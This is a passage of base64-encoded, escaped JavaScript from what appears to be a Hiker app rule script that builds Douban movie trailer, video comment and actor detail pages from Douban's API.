FxcXCJcXHJcXG4gICAgICAgIH0pO1xcclxcblxcclxcbiAgICAgICAgc2V0SG9tZVJlc3VsdCh7XFxyXFxuICAgICAgICAgICAgZGF0YTogYS5jb25jYXQobClcXHJcXG4gICAgICAgIH0pXFxyXFxuICAgIH0gZWxzZSB7XFxyXFxuICAgICAgICBzZXRIb21lUmVzdWx0KHtcXHJcXG4gICAgICAgICAgICBkYXRhOiBsXFxyXFxuICAgICAgICB9KVxcclxcbiAgICB9XFxyXFxufVxcclxcblxcclxcbi8v6aKE5ZGK54mH6aG16Z2iXFxyXFxuZnVuY3Rpb24gdHJhaWxlcnModHlwZSwgaWQpIHtcXHJcXG4gICAgc2V0UGFnZVRpdGxlKCfpooTlkYot54mH5q61LeiKsee1ricpXFxyXFxuICAgIGxldCBpID0gZ2V0RG91YmFuUmVzKFxcXCJodHRwczovL2Zyb2RvLmRvdWJhbi5jb20vYXBpL3YyL1xcXCIgKyB0eXBlICsgXFxcIi9cXFwiICsgaWQgKyBcXFwiL3RyYWlsZXJzXFxcIikudHJhaWxlcnM7XFxyXFxuICAgIGkuZm9yRWFjaCgoZSA9PiB7XFxyXFxuICAgICAgICBlLmNvbF90eXBlID0gXFxcIm1vdmllXzJcXFwiLCBlLmRlc2MgPSBlLnN1YmplY3RfdGl0bGUgKyBcXFwi4oCiXFxcIiArIGUuY3JlYXRlX3RpbWUsIGUuaW1nID0gZS5jb3Zlcl91cmwsIGUudXJsID0gZS52aWRlb191cmxcXHJcXG4gICAgfSkpO1xcclxcblxcclxcbiAgICBsZXQgciA9IGkuZmlsdGVyKChlID0+IFxcXCJBXFxcIiA9PT0gZS50eXBlKSk7XFxyXFxuICAgIGxldCBsID0gaS5maWx0ZXIoKGUgPT4gXFxcIkJcXFwiID09PSBlLnR5cGUpKTtcXHJcXG4gICAgbGV0IG8gPSBpLmZpbHRlcigoZSA9PiBcXFwiQ1xcXCIgPT09IGUudHlwZSkpO1xcclxcblxcclxcbiAgICBpZiAoci5sZW5ndGggPiAwKSB7XFxyXFxuICAgICAgICByLnVuc2hpZnQoe1xcclxcbiAgICAgICAgICAgIHRpdGxlOiBcXFwi6aKE5ZGKXFxcIixcXHJcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcInJpY2hfdGV4dFxcXCJcXHJcXG4gICAgICAgIH0pXFxyXFxuICAgIH1cXHJcXG4gICAgaWYgKGwubGVuZ3RoID4gMCkge1xcclxcbiAgICAgICAgbC51bnNoaWZ0KHtcXHJcXG4gICAgICAgICAgICB0aXRsZTogXFxcIueJh+autVxcXCIsXFxyXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJyaWNoX3RleHRcXFwiXFxyXFxuICAgICAgICB9KVxcclxcbiAgICB9XFxyXFxuICAgIGlmIChvLmxlbmd0aCA+IDApIHtcXHJcXG4gICAgICAgIG8udW5zaGlmdCh7XFxyXFxuICAgICAgICAgICAgdGl0bGU6IFxcXCLoirHnta5cXFwiLFxcclxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwicmljaF90ZXh0XFxcIlxcclxcbiAgICAgICAgfSlcXHJcXG4gICAgfVxcclxcblxcclxcbiAgICBzZXRIb21lUmVzdWx0KHtcXHJcXG4gICAgICAgIGRhdGE6IHIuY29uY2F0KGwpXFxyXFxuICAgICAgICAgICAgLmNvbmNhdChvKVxcclxcbiAgICB9KVxcclxcbn1cXHJcXG5cXHJcXG4vL+inhumikeivhOiuuumhtemdolxcclxcbmZ1bmN0aW9uIHZpZGVvQ29tbWVudCh0eXBlLCBpZCkge1xcclxcbiAgICBsZXQgaSA9IGdldERvdWJhblJlcyhcXFwiaHR0cHM6Ly9mcm9kby5kb3ViYW4uY29tL2FwaS92Mi9cXFwiICsgdHlwZSArIFxcXCIvXFxcIiArIGlkICsgXFxcIi92aWRlb3NcXFwiKS52aWRlb3M7XFxyXFxuICAgIGkuZm9yRWFjaCgoZSA9PiB7XFxyXFxuICAgICAgICBlLmNvbF90eXBlID0gXFxcIm1vdmllXzJcXFwiLCBlLmRlc2MgPSBlLmF1dGhvci5uYW1lICsgXFxcIuKAolxcXCIgKyBlLmNyZWF0ZV90aW1lLCBlLmltZyA9IGUuY292ZXJfdXJsICsgXFxcIkBSZWZlcmVyPVxcXCIgKyBlLmNvdmVyX3VybCwgZS51cmwgPSBlLnZpZGVvX3VybFxcclxcbiAgICB9KSlcXHJcXG4gICAgaWYgKGkubGVuZ3RoID4gMCkge1xcclxcbiAgICAgICAgaS51bnNoaWZ0KHtcXHJcXG4gICAgICAgICAgICB0aXRsZTogXFxcIuinhumikeivhOiuulxcXCIsXFxyXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJyaWNoX3RleHRcXFwiXFxyXFxuICAgICAgICB9KVxcclxcbiAgICB9XFxyXFxuICAgIHNldEhvbWVSZXN1bHQoe1xcclxcbiAgICAgICAgZGF0YTogaVxcclxcbiAgICB9KVxcclxcbn1cXHJcXG5cXHJcXG4vL+a8lOiBjOS6uuWRmOivpuaDhemhtemdolxcclxcbmZ1bmN0aW9uIGVsZXNzYXJWaWV3KGlkLCBwaWQsIG5hbWUpIHtcXHJcXG4gICAgc2V0UGFnZVRpdGxlKG5hbWUpO1xcclxcbiAgICBsZXQgaSA9IGdldERvdWJhblJlcyhcXFwiaHR0cHM6Ly9mcm9kby5kb3ViYW4uY29tL2FwaS92Mi9lbGVzc2FyL3N1YmplY3QvXFxcIiArIGlkKTtcXHJcXG4gICAgbGV0IGEgPSBbXTtcXHJcXG4gICAgYS5wdXNoKHtcXHJcXG4gICAgICAgIHRpdGxlOiAn4oCc4oCc4oCd4oCdJyArIChpLnRpdGxlICsgJygnICsgaS5sYXRpbl90aXRsZSArICcpJykuYmlnKCkuYm9sZCgpLFxcclxcbiAgICAgICAgZGVzYzogJ+KAnOKAnOKAneKAnScgKyBpLmRlc2MubWF0Y2goL1xcXFw8cFxcXFw+LipcXFxcPFxcXFwvcFxcXFw+LylbMF0sXFxyXFxuICAgICAgICBpbWc6IGkuY292ZXIubm9ybWFsLnVybCArICdAUmVmZXJlcj0nICsgaS5jb3Zlci5ub3JtYWwudXJsLFxcclxcbiAgICAgICAgY29sX3R5cGU6ICdtb3ZpZV8xX3ZlcnRpY2FsX3BpY19ibHVyJyxcXHJcXG4gICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eScpLnJ1bGUoKGRlc2MsIGV4dHJhLCBuYW1lKSA9PiB7XFxyXFxuICAgICAgICAgICAgbGV0IGluZm8gPSBleHRyYS5pbmZvLm1hcChlID0+IGUuam9pbignOiZuYnNwOycpKTtcXHJcXG4gICAgICAgICAgICBzZXRSZXN1bHQoW3tcXHJcXG4gICAgICAgICAgICAgICAgdGl0bGU6ICc8aDI+JyArIG5hbWUgKyAnPC9oMj4nICsgaW5mby5qb2luKCc8YnIvPicpICsgZGVzYy5tYXRjaCgvXFxcXDxwXFxcXD4uKlxcXFw8XFxcXC9wXFxcXD4vKVswXSxcXHJcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6ICdyaWNoX3RleHQnXFxyXFxuICAgICAgICAgICAgfV0pXFxyXFxuICAgICAgICB9LCBpLmRlc2MsIGkuZXh0cmEsIGkudGl0bGUpXFxyXFxuICAgIH0pXFxyXFxuICAgIFxcclxcbiAgICBsZXQgaW5kZXggPSBpLm1vZHVsZXMuZmluZEluZGV4KGN1ciA9PiBjdXIudHlwZSA9PSBcXFwiYXdhcmRfcmVzdWx0X2NvbGxlY3Rpb25cXFwiKTtcXHJcXG4gICAgaWYgKGluZGV4ID4gLTEpIHtcXHJcXG4gICAgICAgIGxldCBlID0gaS5tb2R1bGVzW2luZGV4XS5wYXlsb2FkO1xcclxcbiAgICAgICAgYS5wdXNoKHtcXHJcXG4gICAgICAgICAgICB0aXRsZTogJ+KAnOKAnOKAneKAnScgKyAn6I635aWW6K6w5b2VJy5iaWcoKS5ib2xkKCkgKyAnPHNtYWxsPijlhbEnICsgZS50b3RhbCArICfpobkpPC9zbWFsbD4nLFxcclxcbiAgICAgICAgICAgIGRlc2M6ICfigJzigJzigJ3igJ08c3Ryb25nPicgKyBlLmF3YXJkc1swXS5jZXJlbW9ueS50aXRsZSArICc8L3N0cm9uZz5cXFxcbicgKyBlLmF3YXJkc1swXS5jYXRlZ29yeS50aXRsZSArIChlLmF3YXJkc1swXS5pc193b24gPyAnJyA6ICco5o+Q5ZCNKScpLFxcclxcbiAgICAgICAgICAgIGNvbF90eXBlOiAndGV4dF9jZW50ZXJfMScsXFxyXFxuICAgICAgICAgICAgdXJsOiAkKCdoaWtlcjovL2VtcHR5LyMvJHBhZ2V7ZnlwYWdlfSNub0hpc3RvcnkjJykucnVsZSgoaWQsIGNvdW50KSA9PiB7XFxyXFxuICAgICAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvbWFpbicpKS5ydWxlKTtcXHJcXG4gICAgICAgICAgICAgICAgZWxlc3NhckF3YXJkcyhpZCwgY291bnQpO1xcclxcbiAgICAgICAgICAgIH0sIGUuaWQsIGUudG90YWwpLFxcclxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxyXFxuICAgICAgICAgICAgICAgIGxpbmVWaXNpYmxlOiBmYWxzZVxcclxcbiAgICAgICAgICAgIH1cXHJcXG4gICAgICAgIH0pXFxyXFxuICAgIH1cXHJcXG4gICAgXFxyXFxuICAgIGluZGV4ID0gaS5tb2R1bGVzLmZpbmRJbmRleChjdXIgPT4gY3VyLnR5cGUgPT0gXFxcIndvcmtfY29sbGVjdGlvbnNcXFwiKTtcXHJcXG4gICAgaWYgKGluZGV4ID4gLTEpIHtcXHJcXG4gICAgICAgIGxldCBlMiA9IGkubW9kdWxlc1tpbmRleF0ucGF5bG9hZDtcXHJcXG4gICAgICAgIGEucHVzaCh7XFxyXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdsaW5lJ1xcclxcbiAgICAgICAgfSlcXHJcXG4gICAgICAgIGEucHVzaCh7XFxyXFxuICAgICAgICAgICAgdGl0bGU6ICfigJzigJzigJ3igJ0nICsgJ+W9seinhuS9nOWTgScuYmlnKCkuYm9sZCgpICsgKCco5YWxJyArIGUyLmNvbGxlY3Rpb25zWzBdLnRvdGFsICsgJ+mDqCknKS5zbWFsbCgpLFxcclxcbiAgICAgICAgICAgIGNvbF90eXBlOiAndGV4dF9jZW50ZXJfMScsXFxyXFxuICAgICAgICAgICAgdXJsOiAkKCdoaWtlcjovL2VtcHR5LyMvJHBhZ2V7ZnlwYWdlfSNub0hpc3RvcnkjJykucnVsZSgoaWQsIHR5cGUpID0+IHtcXHJcXG4gICAgICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9tYWluJykpLnJ1bGUpO1xcclxcbiAgICAgICAgICAgICAgICBlbGVzc2FyV29ya3MoaWQsIHR5cGUpO1xcclxcbiAgICAgICAgICAgIH0sIGUyLmlkLCBlMi5jb2xsZWN0aW9uc1swXS50aXRsZSksXFxyXFxuICAgICAgICAgICAgZXh0cmE6IHtcXHJcXG4gICAgICAgICAgICAgICAgbGluZVZpc2libGU6IGZhbHNlXFxyXFxuICAgICAgICAgICAgfVxcclxcbiAgICAgICAgfSlcXHJcXG5cXHJcXG4gICAgICAgIGxldCBkZXRhaWxzVmlld0NvbmZpZ3MgPSBnZXRDb25maWcoJ2RldGFpbHNWaWV3Q29uZmlncycpO1xcclxcbiAgICAgICAgbGV0IHdvcmtzID0gZTIuY29sbGVjdGlvbnNbMF0ud29ya3M7XFxyXFxuICAgICAgICBsZXQgbGVuZ3RoID0gd29ya3MubGVuZ3RoIDw9IDMgPyB3b3Jrcy5sZW5ndGggOiAzO1xcclxcbiAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBsZW5ndGg7IGkrKykge1xcclxcbiAgICAgICAgICAgIGxldCBlID0gd29ya3NbaV07XFxyXFxuICAgICAgICAgICAgbGV0IHJhdGluZyA9IFxcXCJcXFwiO1xcclxcbiAgICAgICAgICAgIGlmIChlLnN1YmplY3QuZXh0cmEucmF0aW5nX2dyb3VwLnJhdGluZykge1xcclxcbiAgICAgICAgICAgICAgICByYXRpbmcgPSBjb21wdXRlUmF0aW5nKGUuc3ViamVjdC5leHRyYS5yYXRpbmdfZ3JvdXAucmF0aW5nLm1heCwgZS5zdWJqZWN0LmV4dHJhLnJhdGluZ19ncm91cC5yYXRpbmcudmFsdWUpICsgXFxcIiBcXFwiICsgZS5zdWJqZWN0LmV4dHJhLnJhdGluZ19ncm91cC5yYXRpbmcudmFsdWUgKyBcXFwi5YiGXFxcIjtcXHJcXG4gICAgICAgICAgICB9XFxyXFxuXFxyXFxuICAgICAgICAgICAgbGV0IHR5cGUgPSBlLnN1YmplY3Quc3VidHlwZSxcXHJcXG4gICAgICAgICAgICAgICAgaWQgPSBlLnN1YmplY3QuaWQsXFxyXFxuICAgICAgICAgICAgICAgIHRpdGxlID0gZS5zdWJqZWN0LnRpdGxlO1xcclxcbiAgICAgICAgICAgIGxldCB1c2VDb25maWcgPSBkZXRhaWxzVmlld0NvbmZpZ3NbZGV0YWlsc1ZpZXdDb25maWdzLnVzZV0uY29uZmlnO1xcclxcbiAgICAgICAgICAgIGxldCB1cmxQYXJhbXMgPSB7fTtcXHJcXG4gICAgICAgICAgICBpZiAodXNlQ29uZmlnLnN0YXJ0c1dpdGgoJ3snKSkge1xcclxcbiAgICAgICAgICAgICAgICBldmFsKCd1cmxQYXJhbXMgPSAnICsgdXNlQ29uZmlnKTtcXHJcXG4gICAgICAgICAgICB9IGVsc2Uge1xcclxcbiAgICAgICAgICAgICAgICB1cmxQYXJhbXMudXJsID0gJChcXFwiaGlrZXI6Ly9lbXB0eSNub0hpc3RvcnkjI2ltbWVyc2l2ZVRoZW1lI1xcXCIgKyAnP3R5cGU9JyArIHR5cGUgKyAnJmlkPScgKyBpZCkucnVsZSgodHlwZSwgaWQsIHRpdGxlLCB1c2VDb25maWcpID0+IHtcXHJcXG4gICAgICAgICAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvbWFpbicpKS5ydWxlKTtcXHJcXG4gICAgICAgICAgICAgICAgICAgIGlmICh0eXBlID09PSBcXFwicGxheWxpc3RcXFwiKSB7XFxyXFxuICAgICAgICAgICAgICAgICAgICAgICAgZG91TGlzdChpZCwgTVlfUEFHRSwgNTApO1xcclxcbiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHtcXHJcXG4gICAgICAgICAgICAgICAgICAgICAgICBldmFsKHVzZUNvbmZpZyk7XFxyXFxuICAgICAgICAgICAgICAgICAgICB9XFxyXFxuICAgICAgICAgICAgICAgIH0sIHR5cGUsIGlkLCB0aXRsZSwgdXNlQ29uZmlnKTtcXHJcXG4gICAgICAgICAgICB9XFxyXFxuICAgICAgICAgICAgYS5wdXNoKHtcXHJcXG4gICAgICAgICAgICAgICAgdGl0bGU6IHRpdGxlLFxcclxcbiAgICAgICAgICAgICAgICBpbWc6IGUuc3ViamVjdC5jb3Zlci5ub3JtYWwudXJsICsgXFxcIkBSZWZlcmVyPVxcXCIgKyBlLnN1YmplY3QuY292ZXIubm9ybWFsLnVybCxcXHJcXG4gICAgICAgICAgICAgICAgZGVzYzogcmF0aW5nLFxcclxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogJ21vdmllXzMnLFxcclxcbiAgICAgICAgICAgICAgICB1cmw6IHVybFBhcmFtcy51cmwsXFxyXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB1cmxQYXJhbXMuZXh0cmFcXHJcXG4gICAgICAgICAgICB9KVxcclxcbiAgICAgICAgfVxcclxcbiAgICAgICAgLyphLnB1c2goe1xcclxcbiAgICAgICAgICAgIHRpdGxlOiAn5p+l55yL5pu05aSaJyxcXHJcXG4gICAgICAgICAgICBpbWc6ICdodHRwczovL2pva2VyLXR4LmNvZGluZy5uZXQvcC9oaWtlcmltZy9kL2hpa2VyL2dpdC9yYXcvbWFzdGVyL2ltZy9tb3JlX3Zlci5wbmc/ZG93bmxvYWQ9ZmFsc2UnLFxcclxcbiAgICAgICAgICAgIGNvbF90eXBlOiAnbW92aWVfMycsXFxyXFxuICAgICAgICAgICAgdXJsOiAkKCdoaWtlcjovL2VtcHR5LyMvJHBhZ2V7ZnlwYWdlfSNub0hpc3RvcnkjJylcXHJcXG4gICAgICAgICAgICAgICAgLnJ1bGUoKGlkLCB0eXBlKSA9PiB7XFxyXFxuICAgICAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvbWFpbicpKS5ydWxlKTtcXHJcXG4gICAgICAgICAgICAgICAgZWxlc3NhcldvcmtzKGlkLCB0eXBlKTtcXHJcXG4gICAgICAgICAgICB9LCBlMi5pZCwgZTIuY29sbGVjdGlvbnNbMF0udGl0bGUpXFxyXFxuICAgICAgICB9KSovXFxyXFxuICAgIH1cXHJcXG4gICAgXFxyXFxuICAgIGluZGV4ID0gaS5tb2R1bGVzLmZpbmRJbmRleChjdXIgPT4gY3VyLnR5cGUgPT0gXFxcInBob3Rvc1xcXCIpO1xcclxcbiAgICBpZiAoaW5kZXggPiAtMSkge1xcclxcbiAgICAgICAgbGV0IGUzID0gaS5tb2R1bGVzW2luZGV4XS5wYXlsb2FkO1xcclxcbiAgICAgICAgYS5wdXNoKHtcXHJcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ2xpbmUnXFxyXFxuICAgICAgICB9KVxcclxcbiAgICAgICAgYS5wdXNoKHtcXHJcXG4gICAgICAgICAgICB0aXRsZTogJ+KAnOKAnOKAneKAnScgKyAn5ryU5ZGY54Wn54mHJy5iaWcoKS5ib2xkKCkgKyAoJyjlhbEnICsgZTMudG90YWwgKyAn5bygKScpLnNtYWxsKCksXFxyXFxuICAgICAgICAgICAgY29sX3R5cGU6ICd0ZXh0X2NlbnRlcl8xJyxcXHJcXG4gICAgICAgICAgICB1cmw6ICQoJ2hpa2VyOi8vZW1wdHkvIy8kcGFnZXtmeXBhZ2V9I25vSGlzdG9yeSMnKS5ydWxlKChwaWQpID0+IHtcXHJcXG4gICAgICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9tYWluJykpLnJ1bGUpO1xcclxcbiAgICAgICAgICAgICAgICBlbGVzc2FyUGhvdG9zKHBpZCk7XFxyXFxuICAgICAgICAgICAgfSwgcGlkKSxcXHJcXG4gICAgICAgICAgICBleHRyYToge1xcclxcbiAgICAgICAgICAgICAgICBsaW5lVmlzaWJsZTogZmFsc2VcXHJcXG4gICAgICAgICAgICB9XFxyXFxuICAgICAgICB9KVxcclxcblxcclxcbiAgICAgICAgbGV0IHBsZW5ndGggPSBlMy5waG90b3MubGVuZ3RoIDw9IDIgPyBlMy5waG90b3MubGVuZ3RoIDogMjtcXHJcXG4gICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgcGxlbmd0aDsgaSsrKSB7XFxyXFxuICAgICAgICAgICAgYS5wdXNoKHtcXHJcXG4gICAgICAgICAgICAgICAgLy90aXRsZTogZTMucGhvdG9zWzBdLmRlc2NyaXB0aW9uLFxcclxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogJ2NhcmRfcGljXzInLFxcclxcbiAgICAgICAgICAgICAgICBkZXNjOiAnMCcsXFxyXFxuICAgICAgICAgICAgICAgIGltZzogZTMucGhvdG9zW2ldLmltYWdlLm5vcm1hbC51cmwgKyAnQFJlZmVyZXI9JyArIGUzLnBob3Rvc1tpXS5pbWFnZS5ub3JtYWwudXJsLFxcclxcbiAgICAgICAgICAgICAgICB1cmw6IGUzLnBob3Rvc1tpXS5pbWFnZS5ub3JtYWwudXJsICsgJ0BSZWZlcmVyPScgKyBlMy5waG90b3NbaV0uaW1hZ2Uubm9ybWFsLnVybFxcclxcbiAgICAgICAgICAgIH0pXFxyXFxuICAgICAgICB9XFxyXFxuXFxyXFxuICAgICAgICAvKmEucHVzaCh7XFxyXFxuICAgICAgICAgICAgLy90aXRsZTogJ+afpeeci+abtOWkmicsXFxyXFxuICAgICAgICAgICAgaW1nOiAnaHR0cHM6Ly9qb2tlci10eC5jb2RpbmcubmV0L3AvaGlrZXJpbWcvZC9oaWtlci9naXQvcmF3L21hc3Rlci9pbWcvbW9yZS5wbmc/ZG93bmxvYWQ9ZmFsc2UnLFxcclxcbiAgICAgICAgICAgIGNvbF90eXBlOiAnY2FyZF9waWNfMicsXFxyXFxuICAgICAgICAgICAgZGVzYzogJzAnLFxcclxcbiAgICAgICAgICAgIHVybDogJCgnaGlrZXI6Ly9lbXB0eS8jLyRwYWdle2Z5cGFnZX0jbm9IaXN0b3J5IycpXFxyXFxuICAgICAgICAgICAgICAgIC5ydWxlKChwaWQpID0+IHtcXHJcXG4gICAgICAgICAgICAgICAgZXZhbChKU09OLnBhcnNlKHJlcXVlc3QoJ2hpa2VyOi8vcGFnZS9tYWluJykpLnJ1bGUpO1xcclxcbiAgICAgICAgICAgICAgICBlbGVzc2FyUGhvdG9zKHBpZCk7XFxyXFxuICAgICAgICAgICAgfSwgcGlkKVxcclxcbiAgICAgICAgfSkqL1xcclxcbiAgICB9XFxyXFxuXFxyXFxuICAgIHNldFJlc3VsdChhKTtcXHJcXG59XFxyXFxuXFxyXFxuLy/mvJTogYzkurrlkZjojrflpZbor6bmg4XpobXpnaJcXHJcXG5mdW5jdGlvbiBlbGVzc2FyQXdhcmRzKGlkLCBjb3VudCkge1xcclxcbiAgICBsZXQgaSA9IGdldERvdWJhblJlcyhcXFwiaHR0cHM6Ly9mcm9kby5kb3ViYW4uY29tL2FwaS92Mi9lbGVzc2FyL2F3YXJkX3Jlc3VsdF9jb2xsZWN0aW9uL1xcXCIgKyBpZCArIFxcXCIvYXdhcmRzP3N0YXJ0PVxcXCIgKyAzMCAqIChNWV9QQUdFIC0gMSkgKyBcXFwiJmNvdW50PTMwXFxcIik7XFxyXFxuICAgIGxldCBsID0gW107XFxyXFxuICAgIGxldCBkZXRhaWxzVmlld0NvbmZpZ3MgPSBnZXRDb25maWcoJ2RldGFpbHNWaWV3Q29uZmlncycpO1xcclxcbiAgICBpLmF3YXJkcy5mb3JFYWNoKHQgPT4ge1xcclxcbiAgICAgICAgbC5wdXNoKHtcXHJcXG4gICAgICAgICAgICB0aXRsZTogKHQueWVhcitcXFwiXFxcIikuYm9sZCgpLmJpZygpLFxcclxcbiAgICAgICAgICAgIGNvbF90eXBlOiAncmljaF90ZXh0J1xcclxcbiAgICAgICAgfSlcXHJcXG5cXHJcXG4gICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgdC5tb2R1bGVzLmxlbmd0aDsgaSsrKSB7XFxyXFxuICAgICAgICAgICAgbGV0IGUgPSB0Lm1vZHVsZXNbaV07XFxyXFxuICAgICAgICAgICAgaWYgKCFlLmNlcmVtb255IHx8ICFlLmNhdGVnb3J5KSB7XFxyXFxuICAgICAgICAgICAgICAgIGxldCByYXRpbmcgPSBcXFwiXFxcIjtcXHJcXG4gICAgICAgICAgICAgICAgaWYgKGUuZXh0cmEucmF0aW5nX2dyb3VwLnJhdGluZykge1xcclxcbiAgICAgICAgICAgICAgICAgICAgcmF0aW5nID0gY29tcHV0ZVJhdGluZyhlLmV4dHJhLnJhdGluZ19ncm91cC5yYXRpbmcubWF4LCBlLmV4dHJhLnJhdGluZ19ncm91cC5yYXRpbmcudmFsdWUpICsgXFxcIiBcXFwiICsgZS5leHRyYS5yYXRpbmdfZ3JvdXAucmF0aW5nLnZhbHVlICsgXFxcIuWIhlxcXCI7XFxyXFxuICAgICAgICAgICAgICAgIH1cXHJcXG4gICAgICAgICAgICAgICAgbGV0IHR5cGUgPSBlLnN1YnR5cGUsXFxyXFxuICAgICAgICAgICAgICAgICAgICBpZCA9IGUuaWQsXFxyXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZSA9IGUudGl0bGU7XFxyXFxuICAgICAgICAgICAgICAgIGxldCB1c2VDb25maWcgPSBkZXRhaWxzVmlld0NvbmZpZ3NbZGV0YWlsc1ZpZXdDb25maWdzLnVzZV0uY29uZmlnO1xcclxcbiAgICAgICAgICAgICAgICBsZXQgdXJsUGFyYW1zID0ge307XFxyXFxuICAgICAgICAgICAgICAgIGlmICh1c2VDb25maWcuc3RhcnRzV2l0aCgneycpKSB7XFxyXFxuICAgICAgICAgICAgICAgICAgICBldmFsKCd1cmxQYXJhbXMgPSAnICsgdXNlQ29uZmlnKTtcXHJcXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcXHJcXG4gICAgICAgICAgICAgICAgICAgIHVybFBhcmFtcy51cmwgPSAkKFxcXCJoaWtlcjovL2VtcHR5I25vSGlzdG9yeSMjaW1tZXJzaXZlVGhlbWUjXFxcIiArICc/dHlwZT0nICsgdHlwZSArICcmaWQ9JyArIGlkKS5ydWxlKCh0eXBlLCBpZCwgdGl0bGUsIHVzZUNvbmZpZykgPT4ge1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgIGV2YWwoSlNPTi5wYXJzZShyZXF1ZXN0KCdoaWtlcjovL3BhZ2UvbWFpbicpKS5ydWxlKTtcXHJcXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAodHlwZSA9PT0gXFxcInBsYXlsaXN0XFxcIikge1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb3VMaXN0KGlkLCBNWV9QQUdFLCA1MCk7XFxyXFxuICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHtcXHJcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZXZhbCh1c2VDb25maWcpO1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cXHJcXG4gICAgICAgICAgICAgICAgICAgIH0sIHR5cGUsIGlkLCB0aXRsZSwgdXNlQ29uZmlnKTtcXHJcXG4gICAgICAgICAgICAgICAgfVxcclxcbiAgICAgICAgICAgICAgICBsLnB1c2goe1xcclxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IHRpdGxlLFxcclxcbiAgICAgICAgICAgICAgICAgICAgaW1nOiBlLmNvdmVyLm5vcm1hbC51cmwgKyBcXFwiQFJlZmVyZXI9XFxcIiArIGUuY292ZXIubm9ybWFsLnVybCxcXHJcXG4gICAgICAgICAgICAgICAgICAgIGRlc2M6IHJhdGluZyArICdcXFxcbicgKyBlLmV4dHJhLnNob3J0X2luZm8sXFxyXFxuICAgICAgICAgICAgICAgICAgICB1cmw6IHVybFBhcmFtcy51cmwsXFxyXFxuICAgICAgICAgICAgICAgICAgICBleHRyYTogdXJsUGFyYW1zLmV4dHJhXFxyXFxuICAgICAgICAgICAgICAgIH0pXFxyXFxuICAgICAgICAgICAgfSBlbHNlIHtcXHJcXG4gICAgICAgICAgICAgICAgbC5wdXNoKHtcXHJcXG4gICAgICAgICAgICAgICAgICAgIHRpdGxlOiBlLmNlcmVtb255LnRpdGxlLmJvbGQoKSArICc8c21hbGw+KDxhIGhyZWY9XFxcImhpa2VyOi8vZW1wdHkjbm9IaXN0b3J5I0BydWxlPWpzOmV2YWwoSlNPTi5wYXJzZShmZXRjaChgaGlrZXI6Ly9wYWdlL21haW5gKSkucnVsZSk7YXdhcmRWaWV3KGAnICsgZS5jZXJlbW9ueS5pZCArICdgLGAnICsgZS5jZXJlbW9ueS50aXRsZSArICdgKTtcXFwiPuafpeeci+ivpuaDhTwvYT4pPC9zbWFsbD4nICsgJzxici8+JyArIChlLmNhdGVnb3J5LnRpdGxlICsgKGUuaXNfd29uID8gJycgOiAnKOaPkOWQjSknKSkuc21hbGwoKSxcXHJcXG4gICAgICAgICAgICAgICAgICAgIGNvbF90eXBlOiAncmljaF90ZXh0J1xcclxcbiAgICAgICAgICAgICAgICB9KVxcclxcbiAgICAgICAgICAgIH1cXHJcXG4gICAgICAgIH1cXHJcXG4gICAgfSlcXHJcXG5cXHJcXG4gICAgaWYgKE1ZX1BBR0UgPT0gMSkge1xcclxcbiAgICAgICAgbC51bnNoaWZ0KHtcXHJcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcImJsYW5rX2Jsb2NrXFxcIlxcclxcbiAgICAgICAgfSlcXHJcXG4gICAgICAgIGwudW5zaGlmdCh7XFxyXFxuICAgICAgICAgICAgdGl0bGU6IFxcXCI8YmlnPuWFsTxzdHJvbmc+IFxcXCIgKyBjb3VudCArIFxcXCIgPC9zdHJvbmc+6aG56I635aWW6K6w5b2VPC9iaWc+XFxcIixcXHJcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcInJpY2hfdGV4dFxcXCJcXHJcXG4gICAgICAgIH0pXFxyXFxuICAgIH1cXHJcXG4gICAgc2V0UmVzdWx0KGwpO1xcclxcbn1cXHJcXG5cXHJcXG4vL+a8lOiBjOS6uuWRmOS9nOWTgemhtemdolxcclxcbmZ1bmN0aW9uIGVsZXNzYXJXb3JrcyhpZCwgdHlwZSkge1xcclxcbiAgICBsZXQgaSA9IGdldERvdWJhblJlcyhcXFwiaHR0cHM6Ly9mcm9kby5kb3ViYW4uY29tL2FwaS92Mi9lbGVzc2FyL3dvcmtfY29sbGVjdGlvbnMvXFxcIiArIGlkICsgXFxcIi93b3Jrcz9zdGFydD1cXFwiICsgMzAgKiAoTVlfUEFHRSAtIDEpICsgXFxcIiZjb3VudD0zMCZjb2xsZWN0aW9uX3RpdGxlPVxcXCIgKyB0eXBlKTtcXHJcXG5cXHJcXG4gICAgbGV0IGwgPSBbXTtcXHJcXG4gICAgbGV0IGRldGFpbHNWaWV3Q29uZmlncyA9IGdldENvbmZpZygnZGV0